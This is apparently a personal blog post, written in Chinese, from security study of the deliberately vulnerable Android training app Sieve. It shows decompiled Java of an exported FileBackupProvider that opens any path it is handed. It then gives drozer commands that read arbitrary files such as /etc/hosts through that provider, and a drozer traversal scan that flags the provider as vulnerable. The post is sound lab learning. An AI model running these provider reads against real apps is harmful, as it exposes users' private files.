---
title: Test Sieve - content providers exported - File SystemBased
tags: [Android, Drozer]

category: "Tools｜Others｜Android Related｜Drozer｜Test Sieve"
date: 2024-06-04
---

# Test Sieve - content providers exported - File SystemBased
<!-- more -->
1. 有關於基於File System的Content Provider - 逆向
    在`com.mwr.example.sieve.FileBackupProvider`中可以特別注意onCreate以及ParcelFileDescriptor這個funnction
    ```java
    public class FileBackupProvider extends ContentProvider {
        ...
        @Override // android.content.ContentProvider
        public boolean onCreate() {
            this.sUriMatcher.addURI("com.mwr.example.sieve.FileBackupProvider", "*", DATABASE);
            return false;
        }

        @Override // android.content.ContentProvider
        public ParcelFileDescriptor openFile(Uri uri, String mode) {
            int modeCode;
            if (mode.equals("r")) {
                modeCode = 268435456;
            } else if (mode.equals("rw")) {
                modeCode = 805306368;
            } else if (mode.equals("rwt")) {
                modeCode = 805306368;
            } else {
                Log.w(TAG, "Unrecognised code to open file: " + mode);
                return null;
            }
            try {
                return ParcelFileDescriptor.open(new File(uri.getPath()), modeCode);
            } catch (FileNotFoundException e) {
                Log.e(TAG, "ERROR: unable to open file: " + e.getMessage());
                return null;
            }
        }
    ```
5. 實際讀取文件或是Path Traversal
    為了測試他真的能夠讀取到特定文件，我在手機的Download創了一個secret.txt，不管是哪一個file，都可以正常讀取
    ```bash
    $ echo "this is secret file" > /storage/emulated/0/Download/secret.txt
    dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/storage/emulated/0/Download/secret.txt
    Attempting to run shell module
    this is secret file

    dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
    Attempting to run shell module
    127.0.0.1       localhost
    ::1             ip6-localhost
    ```
    也可以利用drozer自動找尋path traversal的漏洞在哪裡
    ```bash
    dz> run scanner.provider.traversal -a com.mwr.example.sieve
    Attempting to run shell module
    Scanning com.mwr.example.sieve...
    Not Vulnerable:
      content://com.mwr.example.sieve.DBContentProvider/Keys/
      content://com.mwr.example.sieve.DBContentProvider/Passwords
      content://com.mwr.example.sieve.DBContentProvider/Passwords/
      content://com.mwr.example.sieve.DBContentProvider/
      content://com.mwr.example.sieve.DBContentProvider/Keys
      content://com.mwr.example.sieve.DBContentProvider

    Vulnerable Providers:
      content://com.mwr.example.sieve.FileBackupProvider
      content://com.mwr.example.sieve.FileBackupProvider/
    ```